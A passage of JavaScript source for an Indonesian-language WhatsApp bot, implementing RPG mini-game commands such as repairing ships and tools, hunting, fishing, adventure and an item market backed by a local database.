contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "PIRATE ADVENTURE",
body: 'Sail across the ocean and go on adventures',
thumbnailUrl: "https://telegra.ph/file/929e089ce3e77a38c398b.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
} else {
balas('Kamu Kalah Battle, Kapal Kamu Mengalami Kerusakan Parah!')
db.data.rpg[m.sender].darahkapal = 0
db.data.rpg[m.sender].battleid = ""
await sleep(5000)
m.reply('Kamu Telah Sampai Ke Tujuan, Kamu Tidak Memperoleh Reward Karena Kalah Battle')
}
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '929e089ce3e77a38c398b': {
let battleid = db.data.rpg[m.sender].battleid
let argas = args[0]
if (`${battleid}` === `${argas}`) {
editp('Berlayar Menjauhi Target...','Kapal Mulai Berlabuh Di Pelabuhan...','Tujuan Sampai, Kamu Tidak Mendapatkan Reward Karena Kabur Dari lawan')
db.data.rpg[m.sender].battleid = ""
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'repair': case 'rawat': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
let rawat = args[0]
switch(rawat) {
case 'kapal':
if (!db.data.users[m.sender].kapal) return warning(`*🙃 Kamu Gak Punya Kapal*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapal`)
if (!db.data.rpg[m.sender].darahkapal < 1) return m.reply(`*😑 Kapal Kamu Masih Bagus*`)
if (db.data.rpg[m.sender].besi < 5) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *5 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
if (db.data.rpg[m.sender].kayu < 10) return m.reply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Perbaikan Kapal*\n\nUntuk Perbaikan Kapal Diperlukan *10 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].besi -= 5
db.data.rpg[m.sender].kayu -= 10
db.data.rpg[m.sender].darahkapal = 100
editp('Memperbaiki, Mohon Tunggu😘','Tahap Finishing 🥳','Done Perbaikan 😄')
break
case 'pickaxe':
if (!db.data.users[m.sender].pickaxe) return warning(`*🙃 Kamu Gak Punya Pickaxe*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pickaxe`)
if (!db.data.rpg[m.sender].darahpickaxe < 1) return m.reply(`*😑 Pickaxe Kamu Masih Bagus*`)
if (db.data.rpg[m.sender].besi < 1) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pickaxe*\n\nUntuk Perbaikan Pickaxe Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].besi -= 1
db.data.rpg[m.sender].darahpickaxe = 100
editp('Memperbaiki, Mohon Tunggu😘','Tahap Finishing 🥳','Done Perbaikan 😄')
break
case 'kapak':
if (!db.data.users[m.sender].kapak) return warning(`*🙃 Kamu Gak Punya Kapak*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Kapak`)
if (!db.data.rpg[m.sender].darahkapak < 1) return m.reply(`*😑 Kapak Kamu Masih Bagus*`)
if (db.data.rpg[m.sender].besi < 1) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Kapak*\n\nUntuk Perbaikan Kapak Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].besi -= 1
db.data.rpg[m.sender].darahkapak = 100
editp('Memperbaiki, Mohon Tunggu😘','Tahap Finishing 🥳','Done Perbaikan 😄')
break
case 'armor':
if (!db.data.users[m.sender].bzirah) return warning(`*🙃 Kamu Gak Punya Baju Zirah*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Baju Zirah`)
if (!db.data.rpg[m.sender].darahbzirah < 1) return m.reply(`*😑 Baju Zirah Kamu Masih Bagus*`)
if (db.data.rpg[m.sender].besi < 2) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Armor*\n\nUntuk Perbaikan Armor Diperlukan *2 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].besi -= 2
db.data.rpg[m.sender].darahbzirah = 100
editp('Memperbaiki, Mohon Tunggu😘','Tahap Finishing 🥳','Done Perbaikan 😄')
break
case 'pedang':
if (!db.data.users[m.sender].pedang) return warning(`*🙃 Kamu Gak Punya Pedang*\n\nUntuk Menggunakan Fitur Ini\nKamu Harus Mempunyai Pedang`)
if (!db.data.rpg[m.sender].darahpedang < 1) return m.reply(`*😑 Pedang Kamu Masih Bagus*`)
if (db.data.rpg[m.sender].besi < 1) return m.reply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Perbaikan Pedang*\n\nUntuk Perbaikan Pedang Diperlukan *1 Besi*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
db.data.rpg[m.sender].besi -= 1
db.data.rpg[m.sender].darahpedang = 100
editp('Memperbaiki, Mohon Tunggu😘','Tahap Finishing 🥳','Done Perbaikan 😄')
break
default:
let teks = `---------- » *PERBAIKAN* « ----------

*Pilih Barang Yang*
*Akan Di perbaiki*
- kapal
- pickaxe
- kapak
- armor
- pedang

*Contoh:*
${prefix + command} kapak

`
vreden.sendMessage(m.chat, {
text: teks,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG TOOLS REPAIR",
body: 'Repairs and upgrades tools',
thumbnailUrl: "https://telegra.ph/file/08e78c20afd16dcebb33d.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
}
break
case 'menebang': case 'nebang': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
if (!db.data.rpg[m.sender].kapak) return m.reply('Kamu Tidak Memiliki Kapak, Silahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
if (db.data.rpg[m.sender].darahkapak < 1) return m.reply('☹️Kapak Kamu Rusak\nRawat Dulu Alat Tebangmu\n\nKetik _.rawat_')
let kayu = await randomNomor(0, 20)
db.data.rpg[m.sender].kayu += kayu
db.data.rpg[m.sender].darahkapak -= 20
balas(`*🌳 MENEBANG POHON 🌳*

Item Yang Didapat:
- Kayu: ${kayu} (Hasil Tebang)
- Kapak: -20 Healthy (Digunakan)

_Tunggu 2 jam untuk_
_penebangan kayu berikutnya_

`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'berburu': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
let domba = await randomNomor(0, 10)
let sapi = await randomNomor(0, 10)
let ayam = await randomNomor(0, 10)
let buulu = domba + sapi + ayam
let bulu = buulu / 2
let waktuu = await clockString(new Date() - db.data.rpg[m.sender].burutime)
if (new Date() - db.data.rpg[m.sender].burutime < 7200000) return m.reply(`Kamu Baru Saja Menebang Pohon ${waktuu} Yang Lalu, Silahkan Tunggu 2 Jam Setelah Terakhir Kali Menebang Pohon`)
db.data.rpg[m.sender].burutime = new Date * 1
db.data.rpg[m.sender].domba += domba
db.data.rpg[m.sender].sapi += sapi
db.data.rpg[m.sender].ayam += ayam
db.data.rpg[m.sender].bulu += bulu
balas(`*🏹 BERBURU 🏹*

Item Yang Didapat:
- Domba: ${domba}
- Sapi: ${sapi}
- Ayam: ${ayam}
- Bulu: ${bulu} (Hasil Pencabutan)

_Tunggu 2 jam untuk_
_berburu berikutnya_

`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'adventure': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
if (db.data.rpg[m.sender].rpgspam) return m.reply('*[ ANTISPAM RPG ]*\n\nTunggu Command RPG\nPertama Kamu Selesai..')
if (db.data.rpg[m.sender].darahuser < 1) return m.reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
var tuju = args.join(" ")
let obj = ["villager","zombie","ghasts","wither","skeleton","wolves"]
let obje = await pickRandom(obj)
let kayu = await randomNomor(15)
let besi = await randomNomor(10)
let rank = await randomNomor(100)
let saldo = await randomNomor(2000)
if (tuju === "savanah") {
db.data.rpg[m.sender].darahuser -= 20
let thumbadv = "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg"
db.data.rpg[m.sender].rpgspam = true
let { key } = await vreden.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...'}, {quoted: m })
await sleep(3000)
await vreden.sendMessage(m.chat, {text: `Kamu bertemu dengan ${obje}`, edit: key });
await sleep(5000)
await vreden.sendMessage(m.chat, {text: `Menjelajah...`, edit: key });
await sleep(3000)
let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
await vreden.sendMessage(m.chat, {
text: adv,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG - ADVENTURE",
body: 'Adventure exploring the world',
thumbnailUrl: thumbadv,
sourceUrl: "tes",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
db.data.rpg[m.sender].kayu += kayu
db.data.rpg[m.sender].besi += besi
db.data.rpg[m.sender].rank += rank
db.data.rpg[m.sender].saldo += saldo
db.data.rpg[m.sender].rpgspam = false
} else if (tuju === "dessert") {
db.data.rpg[m.sender].darahuser -= 20
let thumbadv = "https://telegra.ph/file/760e27568c0b2ccf07231.jpg"
db.data.rpg[m.sender].rpgspam = true
let { key } = await vreden.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...'}, {quoted: m })
await sleep(3000)
await vreden.sendMessage(m.chat, {text: `Kamu bertemu dengan ${obje}`, edit: key });
await sleep(5000)
await vreden.sendMessage(m.chat, {text: `Menjelajah...`, edit: key });
await sleep(3000)
let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
await vreden.sendMessage(m.chat, {
text: adv,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG - ADVENTURE",
body: 'Adventure exploring the world',
thumbnailUrl: thumbadv,
sourceUrl: "tes",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
db.data.rpg[m.sender].kayu += kayu
db.data.rpg[m.sender].besi += besi
db.data.rpg[m.sender].rank += rank
db.data.rpg[m.sender].saldo += saldo
db.data.rpg[m.sender].rpgspam = false
} else if (tuju === "boreal forest") {
db.data.rpg[m.sender].darahuser -= 20
let thumbadv = "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg"
db.data.rpg[m.sender].rpgspam = true
let { key } = await vreden.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...'}, {quoted: m })
await sleep(3000)
await vreden.sendMessage(m.chat, {text: `Kamu bertemu dengan ${obje}`, edit: key });
await sleep(5000)
await vreden.sendMessage(m.chat, {text: `Menjelajah...`, edit: key });
await sleep(3000)
let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
await vreden.sendMessage(m.chat, {
text: adv,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG - ADVENTURE",
body: 'Adventure exploring the world',
thumbnailUrl: thumbadv,
sourceUrl: "tes",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
db.data.rpg[m.sender].kayu += kayu
db.data.rpg[m.sender].besi += besi
db.data.rpg[m.sender].rank += rank
db.data.rpg[m.sender].saldo += saldo
db.data.rpg[m.sender].rpgspam = false
} else if (tuju === "tropical forest") {
db.data.rpg[m.sender].darahuser -= 20
let thumbadv = "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
db.data.rpg[m.sender].rpgspam = true
let { key } = await vreden.sendMessage(m.chat, { text: 'Berpetualang, Mohon Tunggu...'}, {quoted: m })
await sleep(3000)
await vreden.sendMessage(m.chat, {text: `Kamu bertemu dengan ${obje}`, edit: key });
await sleep(5000)
await vreden.sendMessage(m.chat, {text: `Menjelajah...`, edit: key });
await sleep(3000)
let adv = `---------- » *ADVENTURE* « ----------

*📍 ${text}*
- Kayu: ${kayu}
- Besi: ${besi}
- Rank: ${rank}
- Uang: Rp ${saldo}

*Stamina berkurang -20*

`
await vreden.sendMessage(m.chat, {
text: adv,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG - ADVENTURE",
body: 'Adventure exploring the world',
thumbnailUrl: thumbadv,
sourceUrl: "tes",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
db.data.rpg[m.sender].kayu += kayu
db.data.rpg[m.sender].besi += besi
db.data.rpg[m.sender].rank += rank
db.data.rpg[m.sender].saldo += saldo
db.data.rpg[m.sender].rpgspam = false
} else {
let thumbadv = "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg"
let adv = `---------- » *ADVENTURE* « ----------

*Pilih Lokasi Jelajahmu📍*
- savanah
- dessert
- boreal forest
- tropical forest

*Contoh:*
.adventure savanah

`
await vreden.sendMessage(m.chat, {
text: adv,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG - ADVENTURE",
body: 'Adventure exploring the world',
thumbnailUrl: thumbadv,
sourceUrl: "tes",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
db.data.users[m.sender].exp += await randomNomor(20)
}
break
case 'memancing': case 'mancing': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
if (db.data.rpg[m.sender].rpgspam) return m.reply('*[ ANTISPAM RPG ]*\n\nTunggu Command RPG\nPertama Kamu Selesai..')
if (db.data.rpg[m.sender].darahuser < 1) return m.reply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
db.data.rpg[m.sender].rpgspam = true
let ikan = await randomNomor(0, 20)
db.data.rpg[m.sender].ikan += ikan
db.data.rpg[m.sender].darahuser -= 20
let thum = ["https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg","https://telegra.ph/file/2e772e9732c88e153e812.jpg","https://telegra.ph/file/872b36a0dd7b6843f24da.jpg","https://telegra.ph/file/562adf3d43cde4d355e76.jpg","https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"]
let thumn = await pickRandom(thum)
let { key } = await vreden.sendMessage(m.chat, { text: 'Sedang Memancing...'}, {quoted: m })
await sleep(5000)
await vreden.sendMessage(m.chat, {text: `Memperoleh Hasil...`, edit: key });
await sleep(5000)
let txt = `--------- » *MEMANCING* « ---------

Berhasil mendapatkan ${ikan} ikan

_Stamina berkurang -20_

`
vreden.sendMessage(m.chat, {
text: txt,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "RPG - FISHING",
body: 'Looking for fish catch',
thumbnailUrl: thumn,
sourceUrl: "tes",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
db.data.rpg[m.sender].rpgspam = false
}
db.data.users[m.sender].exp += await randomNomor(20)
break
/*case 'battle': {
let ketahananuser = 
let ketahananlawan = 
}
db.data.users[m.sender].exp += await randomNomor(20)
break*/
case 'sell': case 'jual': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
let jual = args[0]
switch(jual) {
case 'emas': {
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 2500)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].emas}` < `${jumlh}`) return m.reply(`*Emas Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].emas -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Emas: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'besi': {
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 1500)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].besi}` < `${jumlh}`) return m.reply(`*Besi Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].besi -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Besi: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'batubara': {
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 1000)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].batubara}` < `${jumlh}`) return m.reply(`*Batu Bara Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].batubara -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Batu Bara: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'perak':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 2000)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].perak}` < `${jumlh}`) return m.reply(`*Perak Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].perak -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Perak: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'kayu':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 500)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].kayu}` < `${jumlh}`) return m.reply(`*Kayu Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].kayu -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Kayu: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'ayam':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 500)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].ayam}` < `${jumlh}`) return m.reply(`*Ayam Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].ayam -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Ayam: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'sapi':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 3000)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].sapi}` < `${jumlh}`) return m.reply(`*Sapi Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].sapi -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Sapi: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'domba':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 2000)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].domba}` < `${jumlh}`) return m.reply(`*Domba Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].domba -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Domba: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'ikan':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 200)
let jumlh = Number(args[1])
if (`${db.data.rpg[m.sender].ikan}` < `${jumlh}`) return m.reply(`*Ikan Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo += uang
db.data.rpg[m.sender].ikan -= parseInt(args[1])
balas(`*MARKET - JUAL🛍️*

*Item Terjual:*
- Ikan: ${args[1]}

*Penghasilan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
default:
let teks = `------- » *🛍️ MARKET 🛍️* « -------

*Pilih Barang Yang*
*Akan Di Jual*
- emas
- besi
- batubara
- perak
- kayu
- ayam
- sapi
- domba
- ikan

*Contoh:*
${prefix + command} ikan

`
vreden.sendMessage(m.chat, {
text: teks,
contextInfo:{ mentionedJid:[m.sender], forwardingScore: 9999, isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: idsaluran, serverMessageId: null, newsletterName: `${namasaluran}`},  
externalAdReply: {  
title: "SELLING MARKET",
body: 'Sell goods to earn money',
thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
sourceUrl: "-",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'buy': case 'beli': {
if (!db.data.users[m.sender].rpg) return warning(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
let beli = args[0]
switch(beli) {
case 'emas':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 2500)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].emas += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Emas: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'besi':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 1500)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].besi += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Besi: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'batubara':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 1000)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].batubara += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Batu Bara: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'perak':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 2000)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].perak += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Perak: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'kayu':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 500)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].kayu += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Kayu: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'ayam':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 500)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
db.data.rpg[m.sender].ayam += parseInt(args[1])
balas(`*MARKET - BELI🛍️*

*Item Dibeli:*
- Ayam: ${args[1]}

*Dibayarkan:*
- Saldo: ${uang}

*Sisa Uang:*
- Saldo Total: ${db.data.users[m.sender].saldo}

`)
}
break
case 'sapi':{
if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
let uang = Number(parseInt(args[1]) * 3000)
if (`${db.data.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Uang Kamu Tidak Cukup*`)
db.data.users[m.sender].saldo -= uang
